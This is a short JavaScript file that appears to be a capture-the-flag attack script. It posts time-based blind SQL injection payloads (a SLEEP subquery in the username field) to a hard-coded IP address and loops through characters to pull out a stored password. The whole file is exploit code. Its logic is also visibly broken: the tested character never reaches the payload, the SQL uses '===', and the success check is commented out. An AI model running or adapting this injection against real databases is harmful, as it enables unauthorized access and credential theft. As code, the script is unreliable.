/*
 * Filename: /Users/A966AK/Workspace/axa-se/sql_blind.js
 * Path: /Users/A966AK/Workspace/axa-se
 * Created Date: Tuesday, November 17th 2020, 8:11:28 am
 * Author: James MARTIN
 * 
 * Copyright (c) 2020 Your Company
 */

const axios = require("axios");
const qs = require("qs");

function postUsername(checkChar) {
  return axios.post("http://54.254.115.115:5001",
    qs.stringify({debug: true, username: `flag1" AND (SELECT IF(SUBSTRING(password,1,1) === "Y",8507,null) 8507 FROM (SELECT(SLEEP(5)))GntO) AND "iqHc"="iqHc`}),
    { 
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8',
        'Accept': 'application/json'
      }
    }
  )
}

async function main() {
  // let currentPassword = "YXhhY3Rme2cxdjNfbTNfYjRja19teV8zeTM1XzFfbV9ibDFuZH0=";
  let currentPassword = "";
  const possibleChars = ["A", "Y", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/", "="];
  let j = 0;
  while (j < possibleChars.length) {
    for (let i = 0; i < possibleChars.length; i++) {
      let checkChar = possibleChars[i];
      console.log("Checking", checkChar);

      const res = await postUsername(`${currentPassword}${checkChar}`);

      console.log(res.data);

      // if (data.includes("this user exists")) {
      //   console.log("Includes", checkChar);
      //   currentPassword += checkChar;
      //   i = 0;
      //   j = 0;
      //   console.log(currentPassword);
      //   break;
      // }
      j++;
    }
  }
  console.log("Password :", currentPassword);
}

main();